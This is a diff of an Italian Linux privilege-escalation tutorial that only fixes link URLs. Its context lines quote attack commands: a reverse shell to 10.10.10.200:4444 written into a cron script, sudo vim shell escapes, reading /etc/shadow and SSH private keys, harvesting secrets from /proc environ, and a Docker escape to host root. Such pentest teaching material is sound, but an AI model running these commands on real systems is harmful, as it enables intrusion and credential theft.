@@ -42,7 +42,7 @@ Quando atterri su un sistema Linux, segui questo ordine. Le tecniche sono ordina
 10. Kernel exploit                  → ultimo resort
 ```
 
-Per l'[enumerazione completa](https://hackita.it/articoli/linux-enumeration) che copre tutti questi vettori sistematicamente.
+Per l'[enumerazione completa](https://hackita.it/articoli/linux-enumeration/) che copre tutti questi vettori sistematicamente.
 
 ## 1. sudo Abuse
 
@@ -59,7 +59,7 @@ User www-data may run the following commands on target:
     (ALL) NOPASSWD: /usr/bin/vim
 ```
 
-`vim` come root senza password. Cerca su [GTFOBins](https://hackita.it/articoli/gtfobins):
+`vim` come root senza password. Cerca su [GTFOBins](https://hackita.it/articoli/gtfobins/):
 
 ```bash
 sudo vim -c '!bash'
@@ -282,7 +282,7 @@ gcc -fPIC -shared -o /home/user/.config/libcustom.so shell.c
 
 ### GTFOBins SUID
 
-Per ogni SUID trovato, cerca su [GTFOBins](https://hackita.it/articoli/gtfobins) la sezione "SUID":
+Per ogni SUID trovato, cerca su [GTFOBins](https://hackita.it/articoli/gtfobins/) la sezione "SUID":
 
 ```bash
 # Esempio: bash SUID
@@ -336,7 +336,7 @@ cat etc/shadow
 /usr/sbin/tcpdump -i eth0 -w /tmp/capture.pcap
 ```
 
-Cattura traffico in chiaro — credenziali [FTP](https://hackita.it/articoli/ftp), [HTTP](https://hackita.it/articoli/web-pentest), [SMTP](https://hackita.it/articoli/porta-587-smtp).
+Cattura traffico in chiaro — credenziali [FTP](https://hackita.it/articoli/porta-ftp-20/), [HTTP](https://hackita.it/articoli/web-pentest/), [SMTP](https://hackita.it/articoli/porta-587-smtp/).
 
 ## 4. Cron Job
 
@@ -412,7 +412,7 @@ echo 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1' > /tmp/backup.sh
 chmod +x /tmp/backup.sh
 ```
 
-### [pspy](https://hackita.it/articoli/pspy) — Scopri cron nascosti
+### [pspy](https://hackita.it/articoli/pspy/) — Scopri cron nascosti
 
 ```bash
 ./pspy64
@@ -459,7 +459,7 @@ find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
 cat /home/admin/.ssh/id_rsa
 ```
 
-Se trovi una chiave privata: `ssh -i id_rsa admin@localhost` o verso altri host. Per gli [attacchi SSH](https://hackita.it/articoli/ssh).
+Se trovi una chiave privata: `ssh -i id_rsa admin@localhost` o verso altri host. Per gli [attacchi SSH](https://hackita.it/articoli/ssh/).
 
 ### .bash\_history
 
@@ -487,7 +487,7 @@ cat /etc/exports
 /home *(rw,no_root_squash)
 ```
 
-Per la tecnica completa con SUID backdoor: [porta 2049 NFS](https://hackita.it/articoli/porta-2049-nfs).
+Per la tecnica completa con SUID backdoor: [porta 2049 NFS](https://hackita.it/articoli/porta-2049-nfs/).
 
 ```bash
 # Dalla tua macchina:
@@ -513,7 +513,7 @@ id
 docker run -v /:/mnt --rm -it alpine chroot /mnt bash
 ```
 
-Root sull'host. Per i dettagli completi: [container escape](https://hackita.it/articoli/container-escape) e [porta 2375 Docker](https://hackita.it/articoli/porta-2375-docker-api).
+Root sull'host. Per i dettagli completi: [container escape](https://hackita.it/articoli/container-escape/) e [porta 2375 Docker](https://hackita.it/articoli/porta-2375-docker-api/).
 
 Se nel gruppo `lxd`:
 
@@ -528,7 +528,7 @@ lxc exec privesc /bin/sh
 
 ## 8. Kernel Exploit
 
-L'ultimo resort — perché i kernel exploit possono crashare il sistema. Per la guida completa: [kernel exploits](https://hackita.it/articoli/kernel-exploits).
+L'ultimo resort — perché i kernel exploit possono crashare il sistema. Per la guida completa: [kernel exploits](https://hackita.it/articoli/kernel/).
 
 ```bash
 uname -r
@@ -590,7 +590,7 @@ cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|token"
 | **pspy**                    | Monitor processi (no root) | `./pspy64`                                |
 | **linux-smart-enumeration** | Enumerazione con livelli   | `bash lse.sh -l 2`                        |
 
-Per l'uso dettagliato di questi tool: [linux enumeration](https://hackita.it/articoli/linux-enumeration).
+Per l'uso dettagliato di questi tool: [linux enumeration](https://hackita.it/articoli/linux-enumeration/).
 
 ## 11. Cheat Sheet Finale
 
@@ -607,7 +607,7 @@ Per l'uso dettagliato di questi tool: [linux enumeration](https://hackita.it/art
 | Kernel         | `uname -r; searchsploit linux kernel`                                  |
 | History        | `cat /home/*/.bash_history`                                            |
 | Writable files | `find / -writable -type f 2>/dev/null`                                 |
-| GTFOBins       | Cerca ogni binario su [gtfobins](https://hackita.it/articoli/gtfobins) |
+| GTFOBins       | Cerca ogni binario su [gtfobins](https://hackita.it/articoli/gtfobins/) |
 
 ***
 
